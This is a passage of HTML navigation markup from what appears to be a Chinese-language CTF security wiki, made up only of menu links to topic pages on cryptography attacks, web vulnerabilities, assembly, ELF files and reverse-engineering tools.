for=nav-4-5-7> 分组模式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=分组模式 data-md-level=3> <label class=md-nav__title for=nav-4-5-7> <span class="md-nav__icon md-icon"></span> 分组模式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/introduction/ class=md-nav__link> 分组模式 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/padding/ class=md-nav__link> 填充方式 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/ecb/ class=md-nav__link> ECB </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/cbc/ class=md-nav__link> CBC </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/pcbc/ class=md-nav__link> PCBC </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/cfb/ class=md-nav__link> CFB </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/ofb/ class=md-nav__link> OFB </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/ctr/ class=md-nav__link> CTR </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/padding-oracle-attack/ class=md-nav__link> Padding Oracle Attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6 type=checkbox id=nav-4-6> <label class=md-nav__link for=nav-4-6> 非对称加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=非对称加密 data-md-level=2> <label class=md-nav__title for=nav-4-6> <span class="md-nav__icon md-icon"></span> 非对称加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/introduction/ class=md-nav__link> 介绍 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-2 type=checkbox id=nav-4-6-2> <label class=md-nav__link for=nav-4-6-2> RSA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=RSA data-md-level=3> <label class=md-nav__title for=nav-4-6-2> <span class="md-nav__icon md-icon"></span> RSA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_theory/ class=md-nav__link> RSA 介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_module_attack/ class=md-nav__link> 模数相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_e_attack/ class=md-nav__link> 公钥指数相关攻击 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-2-4 type=checkbox id=nav-4-6-2-4> <label class=md-nav__link for=nav-4-6-2-4> 私钥d相关攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=私钥d相关攻击 data-md-level=4> <label class=md-nav__title for=nav-4-6-2-4> <span class="md-nav__icon md-icon"></span> 私钥d相关攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/d_attacks/rsa_d_attack/ class=md-nav__link> 私钥 d 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener/ class=md-nav__link> 扩展维纳攻击 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/ class=md-nav__link> Coppersmith 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/ class=md-nav__link> RSA 选择明密文攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_side_channel/ class=md-nav__link> RSA 侧信道攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/ class=md-nav__link> Bleichenbacher's attack </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_complex/ class=md-nav__link> RSA 复杂题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-3 type=checkbox id=nav-4-6-3> <label class=md-nav__link for=nav-4-6-3> 背包加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=背包加密 data-md-level=3> <label class=md-nav__title for=nav-4-6-3> <span class="md-nav__icon md-icon"></span> 背包加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/knapsack/knapsack/ class=md-nav__link> 背包加密 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-4 type=checkbox id=nav-4-6-4> <label class=md-nav__link for=nav-4-6-4> 离散对数相关 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=离散对数相关 data-md-level=3> <label class=md-nav__title for=nav-4-6-4> <span class="md-nav__icon md-icon"></span> 离散对数相关 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/discrete-log/discrete-log/ class=md-nav__link> 离散对数 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/discrete-log/elgamal/ class=md-nav__link> ElGamal </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/discrete-log/ecc/ class=md-nav__link> ECC </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-5 type=checkbox id=nav-4-6-5> <label class=md-nav__link for=nav-4-6-5> 格密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=格密码 data-md-level=3> <label class=md-nav__title for=nav-4-6-5> <span class="md-nav__icon md-icon"></span> 格密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/lattice/overview/ class=md-nav__link> 格概述 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/lattice/introduction/ class=md-nav__link> 基本介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/lattice/lattice-reduction/ class=md-nav__link> 格基规约算法 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/lattice/cvp/ class=md-nav__link> CVP </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7 type=checkbox id=nav-4-7> <label class=md-nav__link for=nav-4-7> 哈希函数 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=哈希函数 data-md-level=2> <label class=md-nav__title for=nav-4-7> <span class="md-nav__icon md-icon"></span> 哈希函数 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/introduction/ class=md-nav__link> 哈希函数 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-2 type=checkbox id=nav-4-7-2> <label class=md-nav__link for=nav-4-7-2> MD5 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MD5 data-md-level=3> <label class=md-nav__title for=nav-4-7-2> <span class="md-nav__icon md-icon"></span> MD5 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/md5/ class=md-nav__link> MD5 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-3 type=checkbox id=nav-4-7-3> <label class=md-nav__link for=nav-4-7-3> SHA1 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SHA1 data-md-level=3> <label class=md-nav__title for=nav-4-7-3> <span class="md-nav__icon md-icon"></span> SHA1 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/sha1/ class=md-nav__link> SHA1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-4 type=checkbox id=nav-4-7-4> <label class=md-nav__link for=nav-4-7-4> FNV <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=FNV data-md-level=3> <label class=md-nav__title for=nav-4-7-4> <span class="md-nav__icon md-icon"></span> FNV </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/fnv/ class=md-nav__link> Fowler–Noll–Vo hash function </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-5 type=checkbox id=nav-4-7-5> <label class=md-nav__link for=nav-4-7-5> Hash Attack <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hash Attack" data-md-level=3> <label class=md-nav__title for=nav-4-7-5> <span class="md-nav__icon md-icon"></span> Hash Attack </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/attack/ class=md-nav__link> Hash Attack </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../crypto/hash/complex/ class=md-nav__link> 综合题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8 type=checkbox id=nav-4-8> <label class=md-nav__link for=nav-4-8> 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=数字签名 data-md-level=2> <label class=md-nav__title for=nav-4-8> <span class="md-nav__icon md-icon"></span> 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/signature/introduction/ class=md-nav__link> 数字签名 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-2 type=checkbox id=nav-4-8-2> <label class=md-nav__link for=nav-4-8-2> RSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="RSA 数字签名" data-md-level=3> <label class=md-nav__title for=nav-4-8-2> <span class="md-nav__icon md-icon"></span> RSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/signature/rsa/ class=md-nav__link> RSA 数字签名 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-3 type=checkbox id=nav-4-8-3> <label class=md-nav__link for=nav-4-8-3> ElGamal 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ElGamal 数字签名" data-md-level=3> <label class=md-nav__title for=nav-4-8-3> <span class="md-nav__icon md-icon"></span> ElGamal 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/signature/elgamal/ class=md-nav__link> ElGamal </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-4 type=checkbox id=nav-4-8-4> <label class=md-nav__link for=nav-4-8-4> DSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="DSA 数字签名" data-md-level=3> <label class=md-nav__title for=nav-4-8-4> <span class="md-nav__icon md-icon"></span> DSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/signature/dsa/ class=md-nav__link> DSA </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9 type=checkbox id=nav-4-9> <label class=md-nav__link for=nav-4-9> 攻击思想总结 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=攻击思想总结 data-md-level=2> <label class=md-nav__title for=nav-4-9> <span class="md-nav__icon md-icon"></span> 攻击思想总结 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/attack-summary/attack-mode/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9-2 type=checkbox id=nav-4-9-2> <label class=md-nav__link for=nav-4-9-2> 中间相遇攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=中间相遇攻击 data-md-level=3> <label class=md-nav__title for=nav-4-9-2> <span class="md-nav__icon md-icon"></span> 中间相遇攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/attack-summary/meet-in-the-middle/ class=md-nav__link> 中间相遇攻击 - MITM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9-3 type=checkbox id=nav-4-9-3> <label class=md-nav__link for=nav-4-9-3> 比特攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=比特攻击 data-md-level=3> <label class=md-nav__title for=nav-4-9-3> <span class="md-nav__icon md-icon"></span> 比特攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/attack-summary/bit-attack/ class=md-nav__link> 比特攻击 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-10 type=checkbox id=nav-4-10> <label class=md-nav__link for=nav-4-10> 证书格式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=证书格式 data-md-level=2> <label class=md-nav__title for=nav-4-10> <span class="md-nav__icon md-icon"></span> 证书格式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/certificate/introduction/ class=md-nav__link> 证书格式 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5 type=checkbox id=nav-5> <label class=md-nav__link for=nav-5> Web <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=1> <label class=md-nav__title for=nav-5> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/introduction/ class=md-nav__link> Web 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-2 type=checkbox id=nav-5-2> <label class=md-nav__link for=nav-5-2> SQL 注入 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SQL 注入" data-md-level=2> <label class=md-nav__title for=nav-5-2> <span class="md-nav__icon md-icon"></span> SQL 注入 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/sqli/ class=md-nav__link> SQL 注入 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-3 type=checkbox id=nav-5-3> <label class=md-nav__link for=nav-5-3> XSS 跨站脚本攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="XSS 跨站脚本攻击" data-md-level=2> <label class=md-nav__title for=nav-5-3> <span class="md-nav__icon md-icon"></span> XSS 跨站脚本攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/xss/ class=md-nav__link> XSS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-4 type=checkbox id=nav-5-4> <label class=md-nav__link for=nav-5-4> CSRF 跨站请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="CSRF 跨站请求伪造" data-md-level=2> <label class=md-nav__title for=nav-5-4> <span class="md-nav__icon md-icon"></span> CSRF 跨站请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/csrf/ class=md-nav__link> CSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-5 type=checkbox id=nav-5-5> <label class=md-nav__link for=nav-5-5> SSRF 服务端请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SSRF 服务端请求伪造" data-md-level=2> <label class=md-nav__title for=nav-5-5> <span class="md-nav__icon md-icon"></span> SSRF 服务端请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/ssrf/ class=md-nav__link> SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-6 type=checkbox id=nav-5-6> <label class=md-nav__link for=nav-5-6> PHP 代码审计 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="PHP 代码审计" data-md-level=2> <label class=md-nav__title for=nav-5-6> <span class="md-nav__icon md-icon"></span> PHP 代码审计 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/php/php/ class=md-nav__link> PHP 代码审计 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6 type=checkbox id=nav-6> <label class=md-nav__link for=nav-6> Assembly <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Assembly data-md-level=1> <label class=md-nav__title for=nav-6> <span class="md-nav__icon md-icon"></span> Assembly </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../assembly/x86-x64/readme/ class=md-nav__link> x86_x64 </a> </li> <li class=md-nav__item> <a href=../../../../../../assembly/mips/readme/ class=md-nav__link> MIPS </a> </li> <li class=md-nav__item> <a href=../../../../../../assembly/arm/readme/ class=md-nav__link> ARM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7 type=checkbox id=nav-7> <label class=md-nav__link for=nav-7> Executable <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Executable data-md-level=1> <label class=md-nav__title for=nav-7> <span class="md-nav__icon md-icon"></span> Executable </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1 type=checkbox id=nav-7-1> <label class=md-nav__link for=nav-7-1> ELF 文件 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件" data-md-level=2> <label class=md-nav__title for=nav-7-1> <span class="md-nav__icon md-icon"></span> ELF 文件 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-1 type=checkbox id=nav-7-1-1> <label class=md-nav__link for=nav-7-1-1> ELF 文件基本结构 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件基本结构" data-md-level=3> <label class=md-nav__title for=nav-7-1-1> <span class="md-nav__icon md-icon"></span> ELF 文件基本结构 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/basic-info/ class=md-nav__link> ELF 文件 </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/sections/ class=md-nav__link> Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/code-sections/ class=md-nav__link> Code Section </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/data-related-sections/ class=md-nav__link> Data Related Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/symbol-table/ class=md-nav__link> .symtab: Symbol Table </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/strings-sections/ class=md-nav__link> String Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/dynamic-sections/ class=md-nav__link> Dynamic Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/misc-sections/ class=md-nav__link> Misc Sections </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-2 type=checkbox id=nav-7-1-2> <label class=md-nav__link for=nav-7-1-2> 程序加载 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序加载 data-md-level=3> <label class=md-nav__title for=nav-7-1-2> <span class="md-nav__icon md-icon"></span> 程序加载 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../executable/elf/program-loading/ class=md-nav__link> 程序加载 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-3 type=checkbox id=nav-7-1-3> <label class=md-nav__link for=nav-7-1-3> 程序链接 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序链接 data-md-level=3> <label class=md-nav__title for=nav-7-1-3> <span class="md-nav__icon md-icon"></span> 程序链接 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../executable/elf/linking/program-linking/ class=md-nav__link> 程序链接 </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/linking/symbol-resolve/ class=md-nav__link> Symbol Reslove </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-4 type=checkbox id=nav-7-1-4> <label class=md-nav__link for=nav-7-1-4> 程序执行流程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序执行流程 data-md-level=3> <label class=md-nav__title for=nav-7-1-4> <span class="md-nav__icon md-icon"></span> 程序执行流程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../executable/elf/running-overview/ class=md-nav__link> 程序执行流程 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8 type=checkbox id=nav-8> <label class=md-nav__link for=nav-8> Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Reverse data-md-level=1> <label class=md-nav__title for=nav-8> <span class="md-nav__icon md-icon"></span> Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-1 type=checkbox id=nav-8-1> <label class=md-nav__link for=nav-8-1> Reverse Overview <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Reverse Overview" data-md-level=2> <label class=md-nav__title for=nav-8-1> <span class="md-nav__icon md-icon"></span> Reverse Overview </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/introduction/ class=md-nav__link> 软件逆向工程简介 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2 type=checkbox id=nav-8-2> <label class=md-nav__link for=nav-8-2> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=2> <label class=md-nav__title for=nav-8-2> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-1 type=checkbox id=nav-8-2-1> <label class=md-nav__link for=nav-8-2-1> 静态分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=静态分析 data-md-level=3> <label class=md-nav__title for=nav-8-2-1> <span class="md-nav__icon md-icon"></span> 静态分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/tools/static-analyze/ida/ class=md-nav__link> IDA Pro </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/static-analyze/ghidra/ class=md-nav__link> Ghidra </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/static-analyze/jadx/ class=md-nav__link> jadx </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/static-analyze/dnspy/ class=md-nav__link> Dnspy </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-2 type=checkbox id=nav-8-2-2> <label class=md-nav__link for=nav-8-2-2> 动态调试 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=动态调试 data-md-level=3> <label class=md-nav__title for=nav-8-2-2> <span class="md-nav__icon md-icon"></span> 动态调试 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/tools/debug/gdb/ class=md-nav__link> gdb </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/debug/ollydbg/ class=md-nav__link> ollydbg </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/debug/xdbg/ class=md-nav__link> x64dbg/x32dbg </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/debug/windbg/ class=md-nav__link> windbg </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-3 type=checkbox id=nav-8-2-3> <label class=md-nav__link for=nav-8-2-3> 约束求解 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=约束求解 data-md-level=3> <label class=md-nav__title for=nav-8-2-3> <span class="md-nav__icon md-icon"></span> 约束求解 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/tools/constraint/z3/ class=md-nav__link> z3 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-4 type=checkbox id=nav-8-2-4> <label class=md-nav__link for=nav-8-2-4> 模拟执行 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=模拟执行 data-md-level=3> <label class=md-nav__title for=nav-8-2-4> <span class="md-nav__icon md-icon"></span> 模拟执行 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/tools/simulate-execution/angr/ class=md-nav__link> angr </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/simulate-execution/unicorn/ class=md-nav__link> Unicorn Engine </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-3 type=checkbox id=nav-8-3> <label class=md-nav__link for=nav-8-3> 算法逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=算法逆向 data-md-level=2> <label class=md-nav__title for=nav-8-3> <span class="md-nav__icon md-icon"></span> 算法逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/identify-encode-encryption/introduction/ class=md-nav__link> 常见加密算法和编码识别 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-4 type=checkbox id=nav-8-4> <label class=md-nav__link for=nav-8-4> 代码混淆 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=代码混淆 data-md-level=2> <label class=md-nav__title for=nav-8-4> <span class="md-nav__icon md-icon"></span> 代码混淆 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/obfuscate/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/obfuscate/smc/ class=md-nav__link> Self-Modified Code </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/obfuscate/control-flow-flatten/ class=md-nav__link> 控制流平坦化 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/obfuscate/movfuscator/ class=md-nav__link> movofuscator </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-5 type=checkbox id=nav-8-5> <label class=md-nav__link for=nav-8-5> 迷宫逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=迷宫逆向 data-md-level=2> <label class=md-nav__title for=nav-8-5> <span class="md-nav__icon md-icon"></span> 迷宫逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/maze/maze/ class=md-nav__link> 迷宫问题 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-6 type=checkbox id=nav-8-6> <label class=md-nav__link for=nav-8-6> 虚拟机逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=虚拟机逆向 data-md-level=2> <label class=md-nav__title for=nav-8-6> <span class="md-nav__icon md-icon"></span> 虚拟机逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/vm/vm/ class=md-nav__link> 虚拟机分析 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7 type=checkbox id=nav-8-7> <label class=md-nav__link for=nav-8-7> Platform related <span class="md-nav__icon 